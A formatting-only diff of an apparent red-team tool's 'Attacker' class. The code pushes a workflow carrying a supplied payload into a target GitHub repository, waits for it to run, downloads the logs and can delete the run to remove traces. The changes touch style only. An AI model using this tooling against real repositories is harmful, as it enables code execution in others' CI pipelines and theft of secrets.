@@ -43,8 +43,7 @@ class Attacker:
         self.github_url = github_url
 
     def setup_user_info(self):
-        """
-        """
+        """ """
         if not self.user_perms:
             self.user_perms = self.api.check_user()
             if not self.user_perms:
@@ -52,11 +51,12 @@ class Attacker:
                 return False
 
             if self.author_email is None:
-                self.author_email = \
+                self.author_email = (
                     f"{self.user_perms['user']}@users.noreply.github.com"
+                )
 
             if self.author_name is None:
-                self.author_name = self.user_perms['user']
+                self.author_name = self.user_perms["user"]
 
             Output.info(
                 "The authenticated user is: "
@@ -68,34 +68,37 @@ class Attacker:
             )
 
         return True
-    
+
     def create_gist(self, gist_name: str, gist_contents: str):
-        """Create a Gist with the specified contents and return the raw URL.
-        """
+        """Create a Gist with the specified contents and return the raw URL."""
         self.setup_user_info()
 
-        if 'gist' not in self.user_perms['scopes']:
+        if "gist" not in self.user_perms["scopes"]:
             Output.error("Unable to create Gist without gist scope!")
             return False
-        
-        random_id = ''.join(random.choices(string.ascii_lowercase, k=5))
+
+        random_id = "".join(random.choices(string.ascii_lowercase, k=5))
 
         gist_params = {
-            "files": { f"{gist_name}-{random_id}": {"content": gist_contents} }
+            "files": {f"{gist_name}-{random_id}": {"content": gist_contents}}
         }
 
-        result = self.api.call_post('/gists', params=gist_params)
+        result = self.api.call_post("/gists", params=gist_params)
 
         if result.status_code == 201:
-            return result.json()["id"], result.json()["files"][f"{gist_name}-{random_id}"]["raw_url"]
+            return (
+                result.json()["id"],
+                result.json()["files"][f"{gist_name}-{random_id}"]["raw_url"],
+            )
 
     def execute_and_wait_workflow(
-            self,
-            target_repo: str,
-            branch: str,
-            yaml_contents: str,
-            commit_message: str,
-            yaml_name: str):
+        self,
+        target_repo: str,
+        branch: str,
+        yaml_contents: str,
+        commit_message: str,
+        yaml_name: str,
+    ):
         """Utility method to wrap shared logic for pushing a workflow for a new
         branch, waiting for the workflow to execute, and getting the workflow
         ID of the completed workflow.
@@ -121,7 +124,7 @@ class Attacker:
                 f"{yaml_name}.yml",
                 commit_author=self.author_name,
                 commit_email=self.author_email,
-                message=commit_message
+                message=commit_message,
             )
         else:
             rev_hash = self.api.commit_workflow(
@@ -129,7 +132,7 @@ class Attacker:
                 branch,
                 yaml_contents.encode(),
                 f"{yaml_name}.yml",
-                message=commit_message
+                message=commit_message,
             )
 
         if not rev_hash:
@@ -153,9 +156,7 @@ class Attacker:
         Output.tabbed("Waiting for the workflow to queue...")
 
         for i in range(self.timeout):
-            workflow_id = self.api.get_recent_workflow(
-                target_repo, rev_hash, yaml_name
-            )
+            workflow_id = self.api.get_recent_workflow(target_repo, rev_hash, yaml_name)
             if workflow_id == -1:
                 Output.error("Failed to find the created workflow!")
                 return
@@ -185,32 +186,35 @@ class Attacker:
         return workflow_id
 
     def push_workflow_attack(
-            self, target_repo,
-            payload: str,
-            custom_workflow: str,
-            target_branch: str,
-            commit_message: str,
-            delete_action: bool,
-            yaml_name: str = "sh_cicd_attack"):
+        self,
+        target_repo,
+        payload: str,
+        custom_workflow: str,
+        target_branch: str,
+        commit_message: str,
+        delete_action: bool,
+        yaml_name: str = "sh_cicd_attack",
+    ):
 
         self.setup_user_info()
 
         if not self.user_perms:
             return False
 
-        if 'repo' in self.user_perms['scopes'] and \
-           'workflow' in self.user_perms['scopes']:
+        if (
+            "repo" in self.user_perms["scopes"]
+            and "workflow" in self.user_perms["scopes"]
+        ):
 
             Output.info(
-                    f"Will be conducting an attack against {Output.bright(target_repo)} as"
-                    f" the user: {Output.bright(self.user_perms['user'])}!"
+                f"Will be conducting an attack against {Output.bright(target_repo)} as"
+                f" the user: {Output.bright(self.user_perms['user'])}!"
             )
 
             # Randomly generate a branch name, since this will run immediately
             # otherwise it will fail at the push.
             if target_branch is None:
-                branch = ''.join(random.choices(
-                    string.ascii_lowercase, k=10))
+                branch = "".join(random.choices(string.ascii_lowercase, k=10))
             else:
                 branch = target_branch
 
@@ -223,28 +227,20 @@ class Attacker:
                 return
 
             if custom_workflow:
-                with open(custom_workflow, 'r') as custom_wf:
+                with open(custom_workflow, "r") as custom_wf:
                     yaml_contents = custom_wf.read()
             else:
-                yaml_contents = CICDAttack.create_push_yml(
-                    payload, branch
-                )
+                yaml_contents = CICDAttack.create_push_yml(payload, branch)
 
             workflow_id = self.execute_and_wait_workflow(
-                target_repo,
-                branch,
-                yaml_contents,
-                commit_message,
-                yaml_name
+                target_repo, branch, yaml_contents, commit_message, yaml_name
             )
 
             res = self.api.download_workflow_logs(target_repo, workflow_id)
             if not res:
                 Output.error("Failed to download logs!")
             else:
-                Output.result(
-                    f"Workflow logs downloaded to {workflow_id}.zip!"
-                )
+                Output.result(f"Workflow logs downloaded to {workflow_id}.zip!")
 
             if delete_action:
                 res = self.api.delete_workflow_run(target_repo, workflow_id)
@@ -254,7 +250,5 @@ class Attacker:
                     Output.result("Workflow deleted sucesfully!")
         else:
             Output.error(
-                "The user does not have the necessary scopes to conduct this "
-                "attack!")
-
-  
+                "The user does not have the necessary scopes to conduct this " "attack!"
+            )
